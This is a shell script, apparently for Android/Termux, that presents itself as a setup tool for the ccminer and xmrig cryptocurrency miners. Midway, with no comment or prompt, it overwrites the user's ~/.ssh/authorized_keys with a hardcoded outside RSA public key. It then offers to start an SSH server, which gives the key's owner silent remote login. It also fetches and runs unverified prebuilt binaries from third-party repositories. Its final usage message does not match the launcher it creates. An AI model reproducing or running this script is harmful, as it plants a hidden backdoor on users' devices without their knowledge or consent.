#!/bin/sh
sudo apt-get -y update
sudo apt-get -y upgrade
sudo apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano build-essential cmake libuv1-dev libssl-dev libhwloc-dev
wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
mkdir ~/.ssh; chmod 0700 ~/.ssh
cat << EOF > ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5VJBLZt7QR01HkLhTVTjSjve/6vNWJHwI3yxMI5Q3TGiuEVINMJiP0sp6cr8xRe7Ix24a1ZAc3fdu0z658JXKN rsa-key-20190820
EOF
chmod 0600 ~/.ssh/authorized_keys
mkdir ~/ccminer
cd ~/ccminer
wget https://github.com/Oink70/Android-Mining/releases/download/v0.0.0-2/ccminer
wget https://raw.githubusercontent.com/Oink70/Android-Mining/main/config.json
chmod +x ccminer
cd
cat << EOF > ~/mine.sh
#!/bin/bash

username=""
password=""
pool=""
algo=""

read -p "Enter The Algorithm You Would Like To Use Either RandomX Or VerusHash: " algo
read -p "Enter The Url To The Pool You Would Like To Use: " pool
read -p "Enter Your Username For That Pool: " username
read -p "Enter Your Password For That Pool: " password

if [[ -z "$username" || -z "$password" || -z "$pool" || -z "$algo" ]]; then
    echo "Username, password, pool, and the algo options are all required."
    exit 1
fi

if [[ "$algo" = "RandomX" ]]; then
	cd xmrig
	clear
	./xmrig -o $pool -u $username -p $password
fi
if [[ "$algo" = "VerusHash" ]]; then
	cd ccminer
	clear
	./ccminer -a verus -o $pool -u $username -p $password
fi
EOF
chmod +x mine.sh
mkdir xmrig
cd xmrig
wget https://raw.githubusercontent.com/Megax-yt/termux-mining-kit/main/xmrig
chmod +x xmrig
cd
clear

read -p "Do you want to enable ssh? (y/n) Default(No) : " sshtf
if [[ $sshtf == "y" || $sshtf == "yes" ]]; then
	pkg install openssh
	sshd
elif [[ $sshtf == "n" || $sshtf == "no" ]]; then
	echo "ok"
fi

echo "setup nearly complete."
echo 'to run miners type "./mine -o your_pool -u your_username_for_pool -p your_password_for_pool -a your_algorithm_VerusHash_or_RandomX"'
